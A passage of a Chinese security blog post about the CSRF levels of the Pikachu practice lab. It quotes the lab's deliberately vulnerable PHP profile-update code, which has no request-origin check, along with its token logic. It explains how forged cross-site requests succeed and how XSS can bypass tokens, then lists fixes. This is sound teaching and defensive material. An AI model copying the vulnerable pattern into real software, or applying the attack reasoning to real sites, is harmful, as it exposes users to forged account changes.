+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$html1</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sex&#x27;</span>]!=<span class="literal">null</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;phonenum&#x27;</span>]!=<span class="literal">null</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;add&#x27;</span>]!=<span class="literal">null</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="variable">$getdata</span>=<span class="title function_ invoke__">escape</span>(<span class="variable">$link</span>, <span class="variable">$_GET</span>);</span><br><span class="line">        <span class="variable">$query</span>=<span class="string">&quot;update member set sex=&#x27;<span class="subst">&#123;$getdata[&#x27;sex&#x27;]&#125;</span>&#x27;,phonenum=&#x27;<span class="subst">&#123;$getdata[&#x27;phonenum&#x27;]&#125;</span>&#x27;,address=&#x27;<span class="subst">&#123;$getdata[&#x27;add&#x27;]&#125;</span>&#x27;,email=&#x27;<span class="subst">&#123;$getdata[&#x27;email&#x27;]&#125;</span>&#x27; where username=&#x27;<span class="subst">&#123;$_SESSION[&#x27;csrf&#x27;][&#x27;username&#x27;]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span>=<span class="title function_ invoke__">execute</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_affected_rows</span>(<span class="variable">$link</span>)==<span class="number">1</span> || <span class="title function_ invoke__">mysqli_affected_rows</span>(<span class="variable">$link</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:csrf_get.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>POST 版一模一样，只是把 <code>$_GET</code> 换成 <code>$_POST</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;sex&#x27;</span>]!=<span class="literal">null</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;phonenum&#x27;</span>]!=<span class="literal">null</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;add&#x27;</span>]!=<span class="literal">null</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="variable">$getdata</span>=<span class="title function_ invoke__">escape</span>(<span class="variable">$link</span>, <span class="variable">$_POST</span>);</span><br><span class="line">        <span class="variable">$query</span>=<span class="string">&quot;update member set ... where username=&#x27;<span class="subst">&#123;$_SESSION[&#x27;csrf&#x27;][&#x27;username&#x27;]&#125;</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这段代码只检查是否登录，即<code>Session</code>里有没有<code>username</code>，但没有检查这条请求是不是本人主动提交的。</p>
+<p>攻击者只要骗受害者访问一个页面，浏览器就会自动带上<code>PHPSESSID cookie</code>，服务器校验<code>cookie</code>通过，就会执行请求。</p>
+<p>这两关的区别只是”参数放在哪”：URL 里可以做成链接，请求体里只能做成表单。<strong>对服务端而言，两边的校验一模一样——都没有。</strong></p>
+<h3 id="3-2-Token-关：多出来的那一个-就是全部防护"><a href="#3-2-Token-关：多出来的那一个-就是全部防护" class="headerlink" title="3.2 Token 关：多出来的那一个 == 就是全部防护"></a>3.2 Token 关：多出来的那一个 <code>==</code> 就是全部防护</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sex&#x27;</span>]!=<span class="literal">null</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;phonenum&#x27;</span>]!=<span class="literal">null</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;add&#x27;</span>]!=<span class="literal">null</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>]!=<span class="literal">null</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]==<span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>])&#123;</span><br><span class="line">        <span class="comment">// ... 同样的 UPDATE</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//生成token</span></span><br><span class="line"><span class="title function_ invoke__">set_token</span>();</span><br></pre></td></tr></table></figure>
+
+<p>token 的生成在 <code>inc/function.php</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_token</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">       <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">mt_rand</span>(<span class="number">10000</span>,<span class="number">99999</span>),<span class="literal">true</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><strong>每次请求都重新生成</strong>：<code>set_token()</code> 放在页面末尾无条件调用，打开一次页面换一次，重放必然失效；</li>
+<li><strong>绑定会话</strong>：值存在 <code>$_SESSION[&#39;token&#39;]</code>，别人的会话拿不到；</li>
+<li><strong>攻击者读不到</strong>：它被渲染在受害者的页面里，恶意页面受同源策略限制读不到目标站点的响应。</li>
+</ol>
+<p>这也解释了 CSRF 与 XSS 的分工：如果这个站点同时存在 XSS，攻击者就能在受害者浏览器里用同源请求读页面、顺手把 token 读出来。XSS 可以击穿 CSRF token，这也是为什么 XSS 的危害等级通常更高。</p>
+<h3 id="3-3-成因归纳"><a href="#3-3-成因归纳" class="headerlink" title="3.3 成因归纳"></a>3.3 成因归纳</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">登录校验通过（Cookie / Session 有效）</span><br><span class="line">        ↓</span><br><span class="line">参数齐全 → 直接 UPDATE，where 条件取自 session</span><br><span class="line">        ↓</span><br><span class="line">全程无 token、无来源校验、无二次验证</span><br><span class="line">        ↓</span><br><span class="line">攻击者构造的跨站请求同样满足全部条件 → CSRF 成立</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="四、修复方案"><a href="#四、修复方案" class="headerlink" title="四、修复方案"></a>四、修复方案</h2><p>修复 CSRF 的关键是<strong>给写操作加与会话绑定的 CSRF Token</strong>（严格比较、用后轮换、不要放进 URL），同时把改数据的操作从 GET 改成 POST。再辅以 Cookie 的 <code>SameSite</code> 属性、<code>Origin</code>&#x2F;<code>Referer</code> 白名单校验，改密码、转账等重要操作再加一道二次验证即可。</p>
+<hr>
+<h2 id="五、免责声明"><a href="#五、免责声明" class="headerlink" title="五、免责声明"></a>五、免责声明</h2><p>本文所有操作均在<strong>本人本地搭建的 Pikachu 靶场</strong>中完成，<br>Pikachu 是公开的、专用于安全教学的漏洞练习平台。<br>文中涉及的技术仅用于学习与防御研究，<strong>不得用于任何未授权的系统</strong>。<br>对真实系统进行未授权的渗透测试属于违法行为。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://qu0rtz-blip.github.io">Qu0rtz-blip</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://qu0rtz-blip.github.io/2026/11/12/Pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3-CSRF/">https://qu0rtz-blip.github.io/2026/11/12/Pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3-CSRF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://qu0rtz-blip.github.io" target="_blank">Qu0rtz-blip 的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Pikachu%E9%9D%B6%E5%9C%BA/">Pikachu靶场</a><a class="post-meta__tags" href="/tags/CSRF/">CSRF</a><a class="post-meta__tags" href="/tags/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/">跨站请求伪造</a><a class="post-meta__tags" href="/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a></div><div class="post-share"><div class="social-share" data-image="/img/cover-4.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/11/12/Pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3-XSS/" title="Pikachu靶场通关：XSS"><img class="cover" src="/img/cover-3.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Pikachu靶场通关：XSS</div></div><div class="info-2"><div class="info-item-1">皮卡丘（Pikachu）XSS 跨站脚本攻击通关记录 实验环境：Windows 10 + Pikachu + Edge靶场地址：http://10.33.20.10/pikachu/   本次记录皮卡丘靶场 XSS 模块全部 10 个小关卡的通关过程。XSS 的本质是用户输入被浏览器当成了代码执行：同样是往一个框里贴 payload，有的贴在 HTML 正文里、有的贴在标签属性里、有的贴在 ...</div></div></div></a><a class="pagination-related" href="/2026/11/12/Pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3-BruteForce/" title="Pikachu靶场通关：Brute Force"><img class="cover" src="/img/cover-5.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Pikachu靶场通关：Brute Force</div></div><div class="info-2"><div class="info-item-1">皮卡丘（Pikachu）第一关「暴力破解」通关记录 实验环境：Windows 10 + Pikachu + Burp Suite Community  + ffuf靶场地址：http://127.0.0.1/pikachu/     本次记录皮卡丘靶场第一关「暴力破解」的完整通关过程。这一关共四个递进的小关卡，每一关都在前一关的基础上加了一层”看起来有用”的防护；  打完四关之后回到源码，分...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/11/12/Pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3-XSS/" title="Pikachu靶场通关：XSS"><img class="cover" src="/img/cover-3.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-11-12</div><div class="info-item-2">Pikachu靶场通关：XSS</div></div><div class="info-2"><div class="info-item-1">皮卡丘（Pikachu）XSS 跨站脚本攻击通关记录 实验环境：Windows 10 + Pikachu + Edge靶场地址：http://10.33.20.10/pikachu/   本次记录皮卡丘靶场 XSS 模块全部 10 个小关卡的通关过程。XSS 的本质是用户输入被浏览器当成了代码执行：同样是往一个框里贴 payload，有的贴在 HTML 正文里、有的贴在标签属性里、有的贴在 ...</div></div></div></a><a class="pagination-related" href="/2026/11/12/Pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3-BruteForce/" title="Pikachu靶场通关：Brute Force"><img class="cover" src="/img/cover-5.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-11-12</div><div class="info-item-2">Pikachu靶场通关：Brute Force</div></div><div class="info-2"><div class="info-item-1">皮卡丘（Pikachu）第一关「暴力破解」通关记录 实验环境：Windows 10 + Pikachu + Burp Suite Community  + ffuf靶场地址：http://127.0.0.1/pikachu/     本次记录皮卡丘靶场第一关「暴力破解」的完整通关过程。这一关共四个递进的小关卡，每一关都在前一关的基础上加了一层”看起来有用”的防护；  打完四关之后回到源码，分...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Qu0rtz-blip</div><div class="author-info-description">信息安全学习笔记 · CTF 与漏洞复现</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">35</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Qu0rtz-blip"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Qu0rtz-blip" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客，这里记录 CTF 与漏洞复现的学习过程 📝</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9A%AE%E5%8D%A1%E4%B8%98%EF%BC%88Pikachu%EF%BC%89CSRF-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">皮卡丘（Pikachu）CSRF 跨站请求伪造通关记录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81CSRF-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="toc-number">1.1.</span> <span class="toc-text">一、CSRF 跨站请求伪造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95"><span class="toc-number">1.2.</span> <span class="toc-text">二、通关记录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-CSRF-get"><span class="toc-number">1.2.1.</span> <span class="toc-text">2.1 CSRF(get)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-CSRF-post"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.2 CSRF(post)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-CSRF-token"><span class="toc-number">1.2.3.</span> <span class="toc-text">2.3 CSRF(token)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">三、源码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E5%AE%8C%E5%85%A8%E9%9D%A0-Session-Cookie"><span class="toc-number">1.3.1.</span> <span class="toc-text">3.1 身份验证完全靠 Session Cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-Token-%E5%85%B3%EF%BC%9A%E5%A4%9A%E5%87%BA%E6%9D%A5%E7%9A%84%E9%82%A3%E4%B8%80%E4%B8%AA-%E5%B0%B1%E6%98%AF%E5%85%A8%E9%83%A8%E9%98%B2%E6%8A%A4"><span class="toc-number">1.3.2.</span> <span class="toc-text">3.2 Token 关：多出来的那一个 &#x3D;&#x3D; 就是全部防护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-%E6%88%90%E5%9B%A0%E5%BD%92%E7%BA%B3"><span class="toc-number">1.3.3.</span> <span class="toc-text">3.3 成因归纳</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-number">1.4.</span> <span class="toc-text">四、修复方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="toc-number">1.5.</span> <span class="toc-text">五、免责声明</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/11/12/Pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3-BruteForce/" title="Pikachu靶场通关：Brute Force"><img src="/img/cover-5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pikachu靶场通关：Brute Force"/></a><div class="content"><a class="title" href="/2026/11/12/Pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3-BruteForce/" title="Pikachu靶场通关：Brute Force">Pikachu靶场通关：Brute Force</a><time datetime="2026-11-12T04:00:00.000Z" title="发表于 2026-11-12 12:00:00">2026-11-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/11/12/Pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3-CSRF/" title="Pikachu靶场通关：CSRF"><img src="/img/cover-4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pikachu靶场通关：CSRF"/></a><div class="content"><a class="title" href="/2026/11/12/Pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3-CSRF/" title="Pikachu靶场通关：CSRF">Pikachu靶场通关：CSRF</a><time datetime="2026-11-12T04:00:00.000Z" title="发表于 2026-11-12 12:00:00">2026-11-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/11/12/Pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3-XSS/" title="Pikachu靶场通关：XSS"><img src="/img/cover-3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pikachu靶场通关：XSS"/></a><div class="content"><a class="title" href="/2026/11/12/Pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3-XSS/" title="Pikachu靶场通关：XSS">Pikachu靶场通关：XSS</a><time datetime="2026-11-12T04:00:00.000Z" title="发表于 2026-11-12 12:00:00">2026-11-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/11/09/ZoomEye%E4%B8%8E%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86-%E4%BD%9C%E4%B8%9A%E5%8D%9A%E5%AE%A2/" title="网络渗透课程作业：ZoomEye 网络空间测绘与子域名收集"><img src="/img/cover-2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="网络渗透课程作业：ZoomEye 网络空间测绘与子域名收集"/></a><div class="content"><a class="title" href="/2026/11/09/ZoomEye%E4%B8%8E%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86-%E4%BD%9C%E4%B8%9A%E5%8D%9A%E5%AE%A2/" title="网络渗透课程作业：ZoomEye 网络空间测绘与子域名收集">网络渗透课程作业：ZoomEye 网络空间测绘与子域名收集</a><time datetime="2026-11-09T02:47:00.000Z" title="发表于 2026-11-09 10:47:00">2026-11-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/11/06/Meterpreter%20%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E4%B8%8E%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%A4%8D%E7%8E%B0/" title="网络渗透课程作业：Meterpreter 远程控制与一句话木马"><img src="/img/cover-1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="网络渗透课程作业：Meterpreter 远程控制与一句话木马"/></a><div class="content"><a class="title" href="/2026/11/06/Meterpreter%20%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E4%B8%8E%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%A4%8D%E7%8E%B0/" title="网络渗透课程作业：Meterpreter 远程控制与一句话木马">网络渗透课程作业：Meterpreter 远程控制与一句话木马</a><time datetime="2026-11-06T08:57:00.000Z" title="发表于 2026-11-06 16:57:00">2026-11-06</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Qu0rtz-blip</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.7.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.7.2"></script><script src="/js/main.js?v=5.7.2"></script><div class="js-pjax"></div><script src="/js/click-effect.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
